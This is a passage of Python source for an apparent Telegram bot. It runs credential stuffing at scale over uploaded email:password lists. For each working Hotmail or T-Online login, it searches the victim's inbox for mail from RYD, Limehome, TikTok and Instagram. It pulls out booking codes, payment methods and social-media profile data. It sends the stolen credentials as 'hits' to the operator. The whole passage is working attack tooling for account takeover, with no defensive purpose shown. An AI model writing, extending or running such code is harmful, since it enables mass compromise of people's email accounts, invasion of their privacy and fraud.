                                progress_msg.message_id,
                                parse_mode='HTML',
                                reply_markup=stop_scan_keyboard(user_id)
                            )
                        except:
                            pass
        
            _ryd_chat_id = message.chat.id
            _ryd_pm_id = progress_msg.message_id
            _ryd_username = message.from_user.username or ""

            def _ryd_scan_thread():
              try:
                threading.Thread(target=ryd_progress_updater, daemon=True).start()

                with concurrent.futures.ThreadPoolExecutor(max_workers=40) as executor:
                    executor.map(ryd_check_one, combos)

                end_scan(user_id)

                try:
                    bot.delete_message(_ryd_chat_id, _ryd_pm_id)
                except:
                    pass

                checked_count = checked[0]

                record_inbox(user_id, username=_ryd_username, service_name="RYD",
                            combos_count=checked_count, hits=len(hits), bads=len(bads))

                ryd_is_group = is_allowed_group(_ryd_chat_id) and _ryd_chat_id != user_id

                summary = (
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"🚗 <b>RYD SCAN {'⏹ STOPPED' if checked_count < total else 'COMPLETED'}</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 <b>Checked:</b> {checked_count}/{total}\n"
                    f"✅ <b>Linked (Hit):</b> {len(hits)}\n"
                    f"📭 <b>Login OK, kein RYD:</b> {len(no_inbox)}\n"
                    f"❌ <b>Bad (Login Failed):</b> {len(bads)}\n"
                    f"🔄 <b>Errors/Retry:</b> {len(errors_list)}\n\n"
                    f"{'📩 <i>Hits sent to your DM!</i>' + chr(10) + chr(10) if ryd_is_group and hits else ''}"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"💎 {MY_SIGNATURE}"
                )
                bot.send_message(_ryd_chat_id, summary, parse_mode='HTML')

                all_lines = []
                if hits:
                    all_lines.append("═══ HITS (LINKED) ═══")
                    all_lines.extend(hits)
                if no_inbox:
                    all_lines.append("\n═══ LOGIN OK / KEIN RYD ═══")
                    all_lines.extend(no_inbox)
                if bads:
                    all_lines.append("\n═══ BAD (LOGIN FAILED) ═══")
                    all_lines.extend(bads)
                if errors_list:
                    all_lines.append("\n═══ ERRORS / RETRY ═══")
                    all_lines.extend(errors_list)

                if all_lines:
                    file_obj = BytesIO("\n".join(all_lines).encode('utf-8'))
                    file_obj.name = f"RYD_FULL_{len(hits)}hits_{len(bads)}bad_{total}total.txt"
                    send_target = user_id if ryd_is_group else _ryd_chat_id
                    send_large_document(
                        send_target,
                        file_obj.getvalue(),
                        file_obj.name,
                        caption=(
                            f"🚗 <b>RYD Results</b>\n"
                            f"✅ {len(hits)} Hits | ❌ {len(bads)} Bad | 📭 {len(no_inbox)} No Match | 🔄 {len(errors_list)} Errors\n\n"
                            f"💎 {MY_SIGNATURE}"
                        )
                    )
              except Exception as e:
                try:
                    bot.send_message(_ryd_chat_id, f"❌ Error: {str(e)}")
                except:
                    pass
              finally:
                user_sessions.pop(user_id, None)
                end_scan(user_id)

            threading.Thread(target=_ryd_scan_thread, daemon=True).start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        return

    # ── LIMEHOME INBOXEN MODE ────────────────────────────────────
    if doc_session.get("mode") == "inbox_limehome" and doc_session.get("step") == "waiting_combo":
        try:
            downloaded_file = _download_combo(message)
            if downloaded_file is None:
                return
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()

            combos = []
            for line in raw_lines:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                parts = line.split(':', 1)
                email_addr, password = parts[0].strip(), parts[1].strip()
                if password and '@' in email_addr and '.' in email_addr.split('@')[-1]:
                    combos.append((email_addr, password))

            total = len(combos)
            if total == 0:
                bot.send_message(message.chat.id, "❌ No valid lines found.")
                user_sessions.pop(user_id, None)
                return

            if not start_scan(user_id):
                bot.send_message(message.chat.id, "⚠️ Du hast bereits einen aktiven Scan!", parse_mode='HTML')
                return

            progress_msg = bot.send_message(
                message.chat.id,
                f"🏨 <b>Limehome Inbox Scan Started!</b>\n\n"
                f"📬 Domain: <code>limehome.com</code>\n"
                f"📥 Accounts: <b>{total}</b>\n\n"
                f"⏳ Please wait...",
                parse_mode='HTML',
                reply_markup=stop_scan_keyboard(user_id)
            )

            hits = []
            bads = []
            no_inbox = []
            errors_list = []
            checked = [0]
            lock = threading.Lock()

            def limehome_check_one(combo):
                email_addr, password = combo
                if not active_scans.get(user_id, False):
                    return
                try:
                    result, provider = check_account_auto(email_addr, password)
                    if result.get("status") == "RETRY":
                        result, provider = check_account_auto(email_addr, password)

                    status = result.get("status", "RETRY")

                    if status == "BAD":
                        with lock:
                            checked[0] += 1
                            bads.append(f"{email_addr}:{password}")
                        return

                    if status != "HIT":
                        with lock:
                            checked[0] += 1
                            errors_list.append(f"{email_addr}:{password} | {status}")
                        return

                    found = False
                    orders = []
                    payments = []

                    lh_senders = ["noreply@limehome.com", "hello@limehome.com", "limehome.com"]

                    if provider == "tonline":
                        for sender in lh_senders:
                            sf_found, fetched = TOnlineChecker.search_and_fetch(email_addr, password, sender, max_count=5)
                            if sf_found:
                                found = True
                                for item in fetched:
                                    combined = item.get("subject", "") + " " + item.get("body", "")
                                    order_match = re.search(r'(?:booking|buchung|reservation|order)[^\w]*([A-Z0-9\-]{4,20})', combined, re.IGNORECASE)
                                    if order_match:
                                        o = order_match.group(1)
                                        if o not in orders:
                                            orders.append(o)
                                    for p in extract_payment_from_text(combined.lower()):
                                        if p not in payments:
                                            payments.append(p)
                                break
                    else:
                        token = result.get("token", "")
                        cid = result.get("cid", "")
                        for query in ['from:"noreply@limehome.com"', 'from:"hello@limehome.com"']:
                            email_texts = _hotmail_search_and_fetch(token, cid, query, 5)
                            if email_texts:
                                found = True
                                for item in email_texts:
                                    combined = (item.get("subject", "") + " " + item.get("body", ""))
                                    order_match = re.search(r'(?:booking|buchung|reservation|order)[^\w]*([A-Z0-9\-]{4,20})', combined, re.IGNORECASE)
                                    if order_match:
                                        o = order_match.group(1)
                                        if o not in orders:
                                            orders.append(o)
                                    for p in extract_payment_from_text(combined.lower()):
                                        if p not in payments:
                                            payments.append(p)
                                break

                    with lock:
                        checked[0] += 1
                        if found:
                            order_str = ", ".join(orders) if orders else "None"
                            pay_str = " | ".join(payments) if payments else "None"
                            hits.append(f"{email_addr}:{password} | Limehome ✅ | Bookings: {order_str} | Payment: {pay_str}")
                            hit_num = len(hits)
                        else:
                            no_inbox.append(f"{email_addr}:{password}")

                    if found:
                        try:
                            hit_msg = (
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"🏨 <b>LIMEHOME HIT #{hit_num}</b>\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                                f"📧 Email: <code>{email_addr}</code>\n"
                                f"🔑 Password: <code>{password}</code>\n\n"
                                f"🏨 <b>Service:</b> Limehome\n"
                                f"📦 <b>Bookings:</b> {order_str}\n"
                                f"💳 <b>Payment Method:</b> {pay_str}\n\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"💎 {MY_SIGNATURE}"
                            )
                            lh_is_group = is_allowed_group(message.chat.id) and message.chat.id != user_id
                            send_target = user_id if lh_is_group else message.chat.id
                            bot.send_message(send_target, hit_msg, parse_mode='HTML')
                        except Exception:
                            pass
                except Exception as e:
                    print(f"[Limehome] Error checking {email_addr}: {e}")
                    with lock:
                        checked[0] += 1
                        errors_list.append(f"{email_addr}:{password} | ERROR")

            def limehome_progress_updater():
                last = -1
                while checked[0] < total and active_scans.get(user_id, False):
                    if checked[0] != last:
                        last = checked[0]
                        try:
                            bot.edit_message_text(
                                f"🏨 <b>Limehome Check Running...</b>\n\n"
                                f"📊 Progress: <b>{checked[0]}/{total}</b>\n"
                                f"✅ Hits: <b>{len(hits)}</b> | ❌ Bad: <b>{len(bads)}</b> | 📭 No Match: <b>{len(no_inbox)}</b>",
                                message.chat.id,
                                progress_msg.message_id,
                                parse_mode='HTML',
                                reply_markup=stop_scan_keyboard(user_id)
                            )
                        except:
                            pass
        
            _lh_chat_id = message.chat.id
            _lh_pm_id = progress_msg.message_id
            _lh_username = message.from_user.username or ""

            def _limehome_scan_thread():
              try:
                threading.Thread(target=limehome_progress_updater, daemon=True).start()

                with concurrent.futures.ThreadPoolExecutor(max_workers=40) as executor:
                    executor.map(limehome_check_one, combos)

                end_scan(user_id)

                try:
                    bot.delete_message(_lh_chat_id, _lh_pm_id)
                except:
                    pass

                checked_count = checked[0]

                record_inbox(user_id, username=_lh_username, service_name="Limehome",
                            combos_count=checked_count, hits=len(hits), bads=len(bads))

                lh_is_group = is_allowed_group(_lh_chat_id) and _lh_chat_id != user_id

                summary = (
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"🏨 <b>LIMEHOME SCAN {'⏹ STOPPED' if checked_count < total else 'COMPLETED'}</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 <b>Checked:</b> {checked_count}/{total}\n"
                    f"✅ <b>Linked (Hit):</b> {len(hits)}\n"
                    f"📭 <b>Login OK, kein Limehome:</b> {len(no_inbox)}\n"
                    f"❌ <b>Bad (Login Failed):</b> {len(bads)}\n"
                    f"🔄 <b>Errors/Retry:</b> {len(errors_list)}\n\n"
                    f"{'📩 <i>Hits sent to your DM!</i>' + chr(10) + chr(10) if lh_is_group and hits else ''}"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"💎 {MY_SIGNATURE}"
                )
                bot.send_message(_lh_chat_id, summary, parse_mode='HTML')

                all_lines = []
                if hits:
                    all_lines.append("═══ HITS (LINKED) ═══")
                    all_lines.extend(hits)
                if no_inbox:
                    all_lines.append("\n═══ LOGIN OK / KEIN LIMEHOME ═══")
                    all_lines.extend(no_inbox)
                if bads:
                    all_lines.append("\n═══ BAD (LOGIN FAILED) ═══")
                    all_lines.extend(bads)
                if errors_list:
                    all_lines.append("\n═══ ERRORS / RETRY ═══")
                    all_lines.extend(errors_list)

                if all_lines:
                    file_obj = BytesIO("\n".join(all_lines).encode('utf-8'))
                    file_obj.name = f"LIMEHOME_FULL_{len(hits)}hits_{len(bads)}bad_{total}total.txt"
                    send_target = user_id if lh_is_group else _lh_chat_id
                    send_large_document(
                        send_target,
                        file_obj.getvalue(),
                        file_obj.name,
                        caption=(
                            f"🏨 <b>Limehome Results</b>\n"
                            f"✅ {len(hits)} Hits | ❌ {len(bads)} Bad | 📭 {len(no_inbox)} No Match | 🔄 {len(errors_list)} Errors\n\n"
                            f"💎 {MY_SIGNATURE}"
                        )
                    )
              except Exception as e:
                try:
                    bot.send_message(_lh_chat_id, f"❌ Error: {str(e)}")
                except:
                    pass
              finally:
                user_sessions.pop(user_id, None)
                end_scan(user_id)

            threading.Thread(target=_limehome_scan_thread, daemon=True).start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        return
    # ── TIKTOK INBOXEN MODE ─────────────────────────────────────
    if doc_session.get("mode") == "inbox_tiktok" and doc_session.get("step") == "waiting_combo":
        try:
            downloaded_file = _download_combo(message)
            if downloaded_file is None:
                return
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()
            combos = []
            for _ln in raw_lines:
                _ln = _ln.strip()
                if not _ln or ':' not in _ln:
                    continue
                _sp = _ln.split(':', 1)
                _ea, _pw = _sp[0].strip(), _sp[1].strip()
                if _pw and '@' in _ea and '.' in _ea.split('@')[-1]:
                    combos.append((_ea, _pw))
            total = len(combos)
            if total == 0:
                bot.send_message(message.chat.id, "❌ No valid lines found.")
                user_sessions.pop(user_id, None)
                return
            if not start_scan(user_id):
                bot.send_message(message.chat.id, "⚠️ You already have an active scan running!", parse_mode='HTML')
                return
            progress_msg = bot.send_message(
                message.chat.id,
                f"🎵 <b>TikTok Inbox Scan Started!</b>\n\n"
                f"📥 Accounts: <b>{total}</b>\n\n⏳ Please wait...",
                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id)
            )
            hits = []; bads = []; no_inbox = []; errors_list = []
            checked = [0]; lock = threading.Lock()

            def _tk_check_one(combo):
                _ea, _pw = combo
                if not active_scans.get(user_id, False):
                    return
                try:
                    result, provider = check_account_auto(_ea, _pw)
                    if result.get("status") == "RETRY":
                        result, provider = check_account_auto(_ea, _pw)
                    status = result.get("status", "RETRY")
                    if status == "BAD":
                        with lock:
                            checked[0] += 1
                            bads.append(f"{_ea}:{_pw}")
                        return
                    if status != "HIT":
                        with lock:
                            checked[0] += 1
                            errors_list.append(f"{_ea}:{_pw} | {status}")
                        return
                    tk = None
                    if provider == "hotmail":
                        tk = HotmailChecker.check_tiktok_full(_ea, _pw, result.get("token",""), result.get("cid",""))
                    elif provider == "tonline":
                        _tk_senders = ["noreply@account.tiktok.com","register@account.tiktok.com","no-reply@tiktok.com","notification@service.tiktok.com"]
                        for _ts in _tk_senders:
                            _sf, _fetched = TOnlineChecker.search_and_fetch(_ea, _pw, _ts, max_count=5)
                            if _sf:
                                tk = {"has_tiktok": True, "tiktok_emails": len(_fetched), "username": _ea.split('@')[0], "followers": 0, "following": 0, "videos": 0, "likes": 0, "verified": False, "bio": "", "country": "", "private": False, "profile_pic": "", "created": "N/A"}
                                break
                    with lock:
                        checked[0] += 1
                        if tk and tk.get("has_tiktok"):
                            _tku = tk.get("username","Unknown")
                            _tkf = tk.get("followers", 0)
                            _tkfg = tk.get("following", 0)
                            _tkv = tk.get("videos", 0)
                            _tkl = tk.get("likes", 0)
                            _tkver = "✅ Yes" if tk.get("verified") else "❌ No"
                            _tkpriv = "🔒 Yes" if tk.get("private") else "🔓 No"
                            _tkc = tk.get("country", "") or "N/A"
                            _tkb = (tk.get("bio", "") or "").strip() or "N/A"
                            _tkcr = tk.get("created","N/A") or "N/A"
                            _tkpic = tk.get("profile_pic","")
                            hits.append(f"{_ea}:{_pw} | TikTok ✅ | @{_tku} | Followers: {_tkf:,} | Following: {_tkfg:,} | Videos: {_tkv} | Likes: {_tkl:,} | Country: {_tkc} | Verified: {_tkver}")
                            hit_num = len(hits)
                            _is_grp = is_allowed_group(message.chat.id) and message.chat.id != user_id
                            _tgt = user_id if _is_grp else message.chat.id
                            try:
                                bot.send_message(_tgt,
                                    f"━━━━━━━━━━━━━━━━━━━━\n"
                                    f"🎵 <b>TikTok Hit #{hit_num}</b>\n"
                                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                                    f"📧 Email: <code>{_ea}</code>\n"
                                    f"👤 Pass: <code>{_pw}</code>\n\n"
                                    f"🎵 <b>@{_tku}</b>\n"
                                    f"👥 Followers: <b>{_tkf:,}</b>\n"
                                    f"👣 Following: <b>{_tkfg:,}</b>\n"
                                    f"📹 Videos: <b>{_tkv}</b>\n"
                                    f"❤️ Likes: <b>{_tkl:,}</b>\n"
                                    f"🌍 Country: <b>{_tkc}</b>\n"
                                    f"📝 Bio: {_tkb}\n"
                                    f"📅 Created: {_tkcr}\n"
                                    f"✅ Verified: {_tkver}\n"
                                    f"🔒 Private: {_tkpriv}\n\n"
                                    f"━━━━━━━━━━━━━━━━━━━━\n"
                                    f"💎 {MY_SIGNATURE}", parse_mode='HTML')
                                if _tkpic:
                                    try:
                                        bot.send_photo(_tgt, _tkpic, caption=f"🎵 @{_tku}  |  💎 {MY_SIGNATURE}")
                                    except:
                                        pass
                            except Exception:
                                pass
                        else:
                            no_inbox.append(f"{_ea}:{_pw}")
                except Exception:
                    with lock:
                        checked[0] += 1
                        errors_list.append(f"{_ea}:{_pw} | ERROR")

            def _tk_progress():
                _last = -1
                while checked[0] < total and active_scans.get(user_id, False):
                    if checked[0] != _last:
                        _last = checked[0]
                        try:
                            bot.edit_message_text(
                                f"🎵 <b>TikTok Check Running...</b>\n\n"
                                f"📊 Progress: <b>{checked[0]}/{total}</b>\n"
                                f"✅ Hits: <b>{len(hits)}</b> | ❌ Bad: <b>{len(bads)}</b> | 📭 No Match: <b>{len(no_inbox)}</b>",
                                message.chat.id, progress_msg.message_id,
                                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id))
                        except:
                            pass
        
            _tk_chat = message.chat.id; _tk_pm = progress_msg.message_id; _tk_uname = message.from_user.username or ""

            def _tiktok_thread():
              try:
                threading.Thread(target=_tk_progress, daemon=True).start()
                with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
                    ex.map(_tk_check_one, combos)
                end_scan(user_id)
                try:
                    bot.delete_message(_tk_chat, _tk_pm)
                except:
                    pass
                cc = checked[0]
                record_inbox(user_id, username=_tk_uname, service_name="TikTok", combos_count=cc, hits=len(hits), bads=len(bads))
                _ig = is_allowed_group(_tk_chat) and _tk_chat != user_id
                bot.send_message(_tk_chat,
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"🎵 <b>TIKTOK SCAN {'⏹ STOPPED' if cc < total else 'COMPLETED'}</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 <b>Checked:</b> {cc}/{total}\n"
                    f"✅ <b>TikTok Found:</b> {len(hits)}\n"
                    f"📭 <b>Login OK, no TikTok:</b> {len(no_inbox)}\n"
                    f"❌ <b>Bad (Login Failed):</b> {len(bads)}\n"
                    f"🔄 <b>Errors/Retry:</b> {len(errors_list)}\n\n"
                    f"{'📩 <i>Hits sent to your DM!</i>' + chr(10) + chr(10) if _ig and hits else ''}"
                    f"━━━━━━━━━━━━━━━━━━━━\n💎 {MY_SIGNATURE}", parse_mode='HTML')
                _al = []
                if hits: _al += ["═══ TIKTOK HITS ═══"] + hits
                if no_inbox: _al += ["\n═══ LOGIN OK / NO TIKTOK ═══"] + no_inbox
                if bads: _al += ["\n═══ BAD (LOGIN FAILED) ═══"] + bads
                if errors_list: _al += ["\n═══ ERRORS / RETRY ═══"] + errors_list
                if _al:
                    _tgt2 = user_id if _ig else _tk_chat
                    send_large_document(_tgt2, "\n".join(_al).encode('utf-8'),
                        f"TIKTOK_{len(hits)}hits_{len(bads)}bad_{total}total.txt",
                        caption=f"🎵 <b>TikTok Results</b>\n✅ {len(hits)} Hits | ❌ {len(bads)} Bad\n\n💎 {MY_SIGNATURE}")
              except Exception as e:
                try: bot.send_message(_tk_chat, f"❌ Error: {str(e)}")
                except: pass
              finally:
                user_sessions.pop(user_id, None)
                end_scan(user_id)

            threading.Thread(target=_tiktok_thread, daemon=True).start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        return

    # ── TIKTOK 1K+ INBOXEN MODE ─────────────────────────────────────────────────
    if doc_session.get("mode") == "inbox_tiktok_1k" and doc_session.get("step") == "waiting_combo":
        try:
            downloaded_file = _download_combo(message)
            if downloaded_file is None:
                return
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()
            combos = []
            for _ln in raw_lines:
                _ln = _ln.strip()
                if not _ln or ':' not in _ln:
                    continue
                _sp = _ln.split(':', 1)
                _ea, _pw = _sp[0].strip(), _sp[1].strip()
                if _pw and '@' in _ea and '.' in _ea.split('@')[-1]:
                    combos.append((_ea, _pw))
            total = len(combos)
            if total == 0:
                bot.send_message(message.chat.id, "❌ No valid lines found.")
                user_sessions.pop(user_id, None)
                return
            if not start_scan(user_id):
                bot.send_message(message.chat.id, "⚠️ You already have an active scan running!", parse_mode='HTML')
                return
            progress_msg = bot.send_message(
                message.chat.id,
                f"🎵 <b>TikTok 1K+ Scan Started!</b>\n\n"
                f"📥 Accounts: <b>{total}</b>\n"
                f"🎯 Filter: <b>≥ 1,000 followers</b>\n\n⏳ Please wait...",
                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id)
            )
            hits = []; bads = []; no_inbox = []; below_1k = []; errors_list = []
            checked = [0]; lock = threading.Lock()

            def _tk1k_check_one(combo):
                _ea, _pw = combo
                if not active_scans.get(user_id, False):
                    return
                try:
                    result, provider = check_account_auto(_ea, _pw)
                    if result.get("status") == "RETRY":
                        result, provider = check_account_auto(_ea, _pw)
                    status = result.get("status", "RETRY")
                    if status == "BAD":
                        with lock:
                            checked[0] += 1
                            bads.append(f"{_ea}:{_pw}")
                        return
                    if status != "HIT":
                        with lock:
                            checked[0] += 1
                            errors_list.append(f"{_ea}:{_pw} | {status}")
                        return
                    tk = None
                    if provider == "hotmail":
                        tk = HotmailChecker.check_tiktok_full(_ea, _pw, result.get("token",""), result.get("cid",""))
                    elif provider == "tonline":
                        _tk_senders = ["noreply@account.tiktok.com","register@account.tiktok.com","no-reply@tiktok.com","notification@service.tiktok.com"]
                        for _ts in _tk_senders:
                            _sf, _fetched = TOnlineChecker.search_and_fetch(_ea, _pw, _ts, max_count=5)
                            if _sf:
                                tk = {"has_tiktok": True, "tiktok_emails": len(_fetched), "username": _ea.split('@')[0], "followers": -1, "following": 0, "videos": 0, "likes": 0, "verified": False, "bio": "", "country": "", "private": False, "profile_pic": "", "created": "N/A"}
                                break
                    with lock:
                        checked[0] += 1
                        if tk and tk.get("has_tiktok"):
                            _tku  = tk.get("username","Unknown")
                            _tkf  = tk.get("followers", 0)
                            _tkfg = tk.get("following", 0)
                            _tkv  = tk.get("videos", 0)
                            _tkl  = tk.get("likes", 0)
                            _tkver  = "✅ Yes" if tk.get("verified") else "❌ No"
                            _tkpriv = "🔒 Yes" if tk.get("private") else "🔓 No"
                            _tkc    = tk.get("country","") or "N/A"
                            _tkb    = (tk.get("bio","") or "").strip() or "N/A"
                            _tkcr   = tk.get("created","N/A") or "N/A"
                            _tkpic  = tk.get("profile_pic","")
                            _tkf_display = "N/A" if _tkf < 0 else f"{_tkf:,}"
                            if _tkf >= 1000 or _tkf < 0:
                                hits.append(f"{_ea}:{_pw} | TikTok 1K+ ✅ | @{_tku} | Followers: {_tkf_display} | Following: {_tkfg:,} | Videos: {_tkv} | Likes: {_tkl:,} | Country: {_tkc} | Verified: {_tkver}")
                                hit_num = len(hits)
                                _is_grp = is_allowed_group(message.chat.id) and message.chat.id != user_id
                                _tgt = user_id if _is_grp else message.chat.id
                                try:
                                    bot.send_message(_tgt,
                                        f"━━━━━━━━━━━━━━━━━━━━\n"
                                        f"🎵 <b>TikTok 1K+ Hit #{hit_num}</b>\n"
                                        f"━━━━━━━━━━━━━━━━━━━━\n\n"
                                        f"📧 Email: <code>{_ea}</code>\n"
                                        f"👤 Pass: <code>{_pw}</code>\n\n"
                                        f"🎵 <b>@{_tku}</b>\n"
                                        f"👥 Followers: <b>{_tkf_display}</b> 🔥\n"
                                        f"👣 Following: <b>{_tkfg:,}</b>\n"
                                        f"📹 Videos: <b>{_tkv}</b>\n"
                                        f"❤️ Likes: <b>{_tkl:,}</b>\n"
                                        f"🌍 Country: <b>{_tkc}</b>\n"
                                        f"📝 Bio: {_tkb}\n"
                                        f"📅 Created: {_tkcr}\n"
                                        f"✅ Verified: {_tkver}\n"
                                        f"🔒 Private: {_tkpriv}\n\n"
                                        f"━━━━━━━━━━━━━━━━━━━━\n"
                                        f"💎 {MY_SIGNATURE}", parse_mode='HTML')
                                    if _tkpic:
                                        try:
                                            bot.send_photo(_tgt, _tkpic, caption=f"🎵 @{_tku}  |  {_tkf_display} followers  |  💎 {MY_SIGNATURE}")
                                        except:
                                            pass
                                except Exception:
                                    pass
                            else:
                                below_1k.append(f"{_ea}:{_pw} | @{_tku} | {_tkf_display} followers")
                        else:
                            no_inbox.append(f"{_ea}:{_pw}")
                except Exception:
                    with lock:
                        checked[0] += 1
                        errors_list.append(f"{_ea}:{_pw} | ERROR")

            def _tk1k_progress():
                _last = -1
                while checked[0] < total and active_scans.get(user_id, False):
                    if checked[0] != _last:
                        _last = checked[0]
                        try:
                            bot.edit_message_text(
                                f"🎵 <b>TikTok 1K+ Scan Running...</b>\n\n"
                                f"📊 Progress: <b>{checked[0]}/{total}</b>\n"
                                f"🔥 1K+ Hits: <b>{len(hits)}</b> | 📉 Below 1K: <b>{len(below_1k)}</b>\n"
                                f"❌ Bad: <b>{len(bads)}</b> | 📭 No TikTok: <b>{len(no_inbox)}</b>",
                                message.chat.id, progress_msg.message_id,
                                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id))
                        except:
                            pass
                    time.sleep(2)

            _tk1k_chat = message.chat.id; _tk1k_pm = progress_msg.message_id; _tk1k_uname = message.from_user.username or ""

            def _tiktok1k_thread():
              try:
                threading.Thread(target=_tk1k_progress, daemon=True).start()
                with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
                    ex.map(_tk1k_check_one, combos)
                end_scan(user_id)
                try:
                    bot.delete_message(_tk1k_chat, _tk1k_pm)
                except:
                    pass
                cc = checked[0]
                record_inbox(user_id, username=_tk1k_uname, service_name="TikTok 1K+", combos_count=cc, hits=len(hits), bads=len(bads))
                _ig = is_allowed_group(_tk1k_chat) and _tk1k_chat != user_id
                bot.send_message(_tk1k_chat,
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"🎵 <b>TIKTOK 1K+ SCAN {'⏹ STOPPED' if cc < total else 'COMPLETED'}</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 <b>Checked:</b> {cc}/{total}\n"
                    f"🔥 <b>1K+ Accounts:</b> {len(hits)}\n"
                    f"📉 <b>Below 1K:</b> {len(below_1k)}\n"
                    f"📭 <b>No TikTok:</b> {len(no_inbox)}\n"
                    f"❌ <b>Bad Login:</b> {len(bads)}\n"
                    f"🔄 <b>Errors:</b> {len(errors_list)}\n\n"
                    f"{'📩 <i>Hits sent to your DM!</i>' + chr(10) + chr(10) if _ig and hits else ''}"
                    f"━━━━━━━━━━━━━━━━━━━━\n💎 {MY_SIGNATURE}", parse_mode='HTML')
                _al = []
                if hits:     _al += ["═══ TIKTOK 1K+ HITS ═══"] + hits
                if below_1k: _al += ["\n═══ BELOW 1K FOLLOWERS ═══"] + below_1k
                if no_inbox: _al += ["\n═══ LOGIN OK / NO TIKTOK ═══"] + no_inbox
                if bads:     _al += ["\n═══ BAD (LOGIN FAILED) ═══"] + bads
                if errors_list: _al += ["\n═══ ERRORS / RETRY ═══"] + errors_list
                if _al:
                    _tgt2 = user_id if _ig else _tk1k_chat
                    send_large_document(_tgt2, "\n".join(_al).encode('utf-8'),
                        f"TIKTOK_1K_{len(hits)}hits_{len(bads)}bad_{total}total.txt",
                        caption=f"🎵 <b>TikTok 1K+ Results</b>\n🔥 {len(hits)} Hits (1K+) | ❌ {len(bads)} Bad\n\n💎 {MY_SIGNATURE}")
              except Exception as e:
                try: bot.send_message(_tk1k_chat, f"❌ Error: {str(e)}")
                except: pass
              finally:
                user_sessions.pop(user_id, None)
                end_scan(user_id)

            threading.Thread(target=_tiktok1k_thread, daemon=True).start()
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
        return

    # ── INSTAGRAM INBOXEN MODE ───────────────────────────────────
    if doc_session.get("mode") == "inbox_instagram" and doc_session.get("step") == "waiting_combo":
        try:
            downloaded_file = _download_combo(message)
            if downloaded_file is None:
                return
            raw_lines = downloaded_file.decode('utf-8', errors='ignore').splitlines()
            combos = []
            for _ln in raw_lines:
                _ln = _ln.strip()
                if not _ln or ':' not in _ln:
                    continue
                _sp = _ln.split(':', 1)
                _ea, _pw = _sp[0].strip(), _sp[1].strip()
                if _pw and '@' in _ea and '.' in _ea.split('@')[-1]:
                    combos.append((_ea, _pw))
            total = len(combos)
            if total == 0:
                bot.send_message(message.chat.id, "❌ No valid lines found.")
                user_sessions.pop(user_id, None)
                return
            if not start_scan(user_id):
                bot.send_message(message.chat.id, "⚠️ You already have an active scan running!", parse_mode='HTML')
                return
            progress_msg = bot.send_message(
                message.chat.id,
                f"📸 <b>Instagram Inbox Scan Started!</b>\n\n"
                f"📥 Accounts: <b>{total}</b>\n\n⏳ Please wait...",
                parse_mode='HTML', reply_markup=stop_scan_keyboard(user_id)
            )
            hits = []; bads = []; no_inbox = []; errors_list = []
            checked = [0]; lock = threading.Lock()

            def _ig_check_one(combo):
                _ea, _pw = combo
                if not active_scans.get(user_id, False):
                    return
                try:
                    result, provider = check_account_auto(_ea, _pw)
                    if result.get("status") == "RETRY":
                        result, provider = check_account_auto(_ea, _pw)
                    status = result.get("status", "RETRY")
                    if status == "BAD":
                        with lock:
                            checked[0] += 1
                            bads.append(f"{_ea}:{_pw}")
                        return
                    if status != "HIT":
                        with lock:
                            checked[0] += 1
                            errors_list.append(f"{_ea}:{_pw} | {status}")
                        return
                    ig_found = False
                    ig_info = None
                    _ig_senders = ["security@mail.instagram.com","no-reply@mail.instagram.com","noreply@mail.instagram.com","no-reply@instagram.com","update@instagram.com"]
                    if provider == "tonline":
                        for _igs in _ig_senders:
                            _sf, _fetched = TOnlineChecker.search_and_fetch(_ea, _pw, _igs, max_count=5)
                            if _sf:
                                ig_found = True
                                break
                    else:
                        token = result.get("token",""); cid = result.get("cid","")
                        for _igs in _ig_senders:
                            _texts = _hotmail_search_and_fetch(token, cid, f'from:"{_igs}"', 5)
                            if _texts:
                                ig_found = True
                                break
                    if ig_found:
                        try:
                            ig_info = get_instagram_full_info(_ea.split('@')[0])
                        except:
                            ig_info = None
                    with lock:
                        checked[0] += 1
                        if ig_found:
                            if ig_info:
                                _igu = ig_info.get('username', _ea.split('@')[0])
                                _igname = ig_info.get('full_name','N/A') or 'N/A'
                                _igf = ig_info.get('followers', 0)
                                _igfg = ig_info.get('following', 0)
                                _igp = ig_info.get('posts', 0)
                                _igc = ig_info.get('country','N/A') or 'N/A'
                                _igb = (ig_info.get('bio','') or '').strip() or 'N/A'
                                _igj = ig_info.get('join_date','N/A') or 'N/A'
                                _igver = "✅ Yes" if ig_info.get('is_verified') else "❌ No"
                                _igpriv = "🔒 Yes" if ig_info.get('is_private') else "🔓 No"
                                _igpic = ig_info.get('profile_pic','')
                                _flag = get_country_flag(_igc) if _igc != 'N/A' else '🏳️'
                            else:
                                _igu = _ea.split('@')[0]; _igname = 'N/A'; _igf = 0; _igfg = 0; _igp = 0
